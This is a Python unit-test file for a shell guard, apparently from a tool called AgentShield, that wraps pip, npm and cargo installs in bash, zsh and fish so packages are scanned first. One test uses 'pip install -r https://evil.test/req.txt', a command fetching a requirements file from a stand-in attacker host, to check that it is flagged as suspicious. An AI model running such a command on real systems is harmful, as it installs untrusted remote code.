"""Unit tests for guard/shell_wrapper.py."""

from __future__ import annotations

from agentshield.guard.shell_wrapper import (
    _BASH_INIT,
    _FISH_INIT,
    _ZSH_INIT,
    ShellGuard,
)

# ── generate_guard_script ─────────────────────────────────────────────────────


def test_bash_script_returned_for_bash() -> None:
    guard = ShellGuard()
    script = guard.generate_guard_script("/bin/bash")
    assert script == _BASH_INIT


def test_zsh_script_returned_for_zsh() -> None:
    guard = ShellGuard()
    script = guard.generate_guard_script("/bin/zsh")
    assert script == _ZSH_INIT


def test_fish_script_returned_for_fish() -> None:
    guard = ShellGuard()
    script = guard.generate_guard_script("/usr/bin/fish")
    assert script == _FISH_INIT


def test_unknown_shell_defaults_to_bash() -> None:
    guard = ShellGuard()
    script = guard.generate_guard_script("/usr/bin/sh")
    assert script == _BASH_INIT


def test_bare_shell_name_works() -> None:
    guard = ShellGuard()
    assert guard.generate_guard_script("bash") == _BASH_INIT
    assert guard.generate_guard_script("zsh") == _ZSH_INIT


# ── bash script content ───────────────────────────────────────────────────────


def test_bash_script_wraps_pip() -> None:
    assert "function pip()" in _BASH_INIT
    assert 'agentshield guard-scan-cmd pip "$@"' in _BASH_INIT


def test_bash_script_wraps_pip3() -> None:
    assert "function pip3()" in _BASH_INIT


def test_bash_script_wraps_npm() -> None:
    assert "function npm()" in _BASH_INIT
    assert 'agentshield guard-scan-cmd npm "$@"' in _BASH_INIT


def test_bash_script_wraps_cargo() -> None:
    assert "function cargo()" in _BASH_INIT
    assert 'agentshield guard-scan-cmd cargo "$@"' in _BASH_INIT


def test_bash_uses_dollar_at_not_star() -> None:
    assert "$*" not in _BASH_INIT


def test_bash_script_delegates_to_command() -> None:
    assert "command pip" in _BASH_INIT
    assert "command npm" in _BASH_INIT
    assert "command cargo" in _BASH_INIT


def test_bash_script_checks_install_subcommand() -> None:
    assert '"install"' in _BASH_INIT or "== install" in _BASH_INIT


def test_bash_script_aborts_on_block() -> None:
    assert "|| return 1" in _BASH_INIT


# ── zsh script content ────────────────────────────────────────────────────────


def test_zsh_script_wraps_pip() -> None:
    assert "function pip()" in _ZSH_INIT


def test_zsh_script_wraps_cargo() -> None:
    assert "function cargo()" in _ZSH_INIT


def test_zsh_script_aborts_on_block() -> None:
    assert "|| return 1" in _ZSH_INIT


def test_zsh_uses_dollar_at_not_star() -> None:
    assert "$*" not in _ZSH_INIT


# ── fish script content ───────────────────────────────────────────────────────


def test_fish_script_wraps_pip() -> None:
    assert "function pip" in _FISH_INIT


def test_fish_script_wraps_npm() -> None:
    assert "function npm" in _FISH_INIT


def test_fish_script_wraps_cargo() -> None:
    assert "function cargo" in _FISH_INIT


def test_fish_script_aborts_on_block() -> None:
    assert "; or return 1" in _FISH_INIT


def test_fish_uses_argv_not_quoted_string() -> None:
    assert '"pip $argv"' not in _FISH_INIT
    assert "agentshield guard-scan-cmd pip $argv" in _FISH_INIT


# ── guard-scan-cmd integration — shared registry parser ──────────────────────
# Parsing lives in exactly one place now (agentshield.enforce.registry); the
# guard, the Hermes hook, and the Claude Code / Codex hook all use it.


def test_registry_parse_used_for_guard() -> None:
    from agentshield.core.models import Ecosystem
    from agentshield.enforce.registry import parse_packages

    pkgs = parse_packages("pip install requests flask")
    assert ("requests", Ecosystem.PYPI) in pkgs
    assert ("flask", Ecosystem.PYPI) in pkgs


def test_registry_parse_npm_for_guard() -> None:
    from agentshield.core.models import Ecosystem
    from agentshield.enforce.registry import parse_packages

    pkgs = parse_packages("npm install lodash")
    assert ("lodash", Ecosystem.NPM) in pkgs


def test_registry_parse_cargo_for_guard() -> None:
    from agentshield.core.models import Ecosystem
    from agentshield.enforce.registry import parse_packages

    pkgs = parse_packages("cargo add serde")
    assert ("serde", Ecosystem.CARGO) in pkgs


# ── parse_manifests (-r / -c requirements files) ─────────────────────────────


def test_parse_shell_manifests_requirement_flag() -> None:
    from agentshield.enforce.registry import parse_manifests

    paths, suspicions = parse_manifests("pip install -r requirements.txt")
    assert paths == ["requirements.txt"]
    assert suspicions == []


def test_parse_shell_manifests_long_and_equals_forms() -> None:
    from agentshield.enforce.registry import parse_manifests

    paths, _ = parse_manifests("pip install --requirement dev.txt")
    assert paths == ["dev.txt"]
    paths, _ = parse_manifests("pip install --constraint=constraints.txt")
    assert paths == ["constraints.txt"]


def test_parse_shell_manifests_remote_is_suspicious() -> None:
    from agentshield.enforce.registry import parse_manifests

    paths, suspicions = parse_manifests("pip install -r https://evil.test/req.txt")
    assert paths == []
    assert any("remote requirements file" in s for s in suspicions)


def test_parse_shell_manifests_ignores_named_packages() -> None:
    from agentshield.enforce.registry import parse_manifests

    paths, suspicions = parse_manifests("pip install requests flask")
    assert paths == []
    assert suspicions == []


# ── _write_temp_script ────────────────────────────────────────────────────────


def test_write_temp_script_creates_file() -> None:
    import os

    guard = ShellGuard()
    path = guard._write_temp_script("echo hello\n")
    try:
        assert os.path.exists(path)
        with open(path) as f:
            assert "echo hello" in f.read()
    finally:
        os.unlink(path)


def test_write_temp_script_fish_suffix() -> None:
    import os

    guard = ShellGuard()
    path = guard._write_temp_script("# fish\n", suffix=".fish")
    try:
        assert path.endswith(".fish")
    finally:
        os.unlink(path)


# ── guard announcement ────────────────────────────────────────────────────────


def test_guard_active_message_in_bash() -> None:
    assert "AgentShield Guard" in _BASH_INIT


def test_guard_active_message_in_zsh() -> None:
    assert "AgentShield Guard" in _ZSH_INIT


def test_guard_active_message_in_fish() -> None:
    assert "AgentShield Guard" in _FISH_INIT
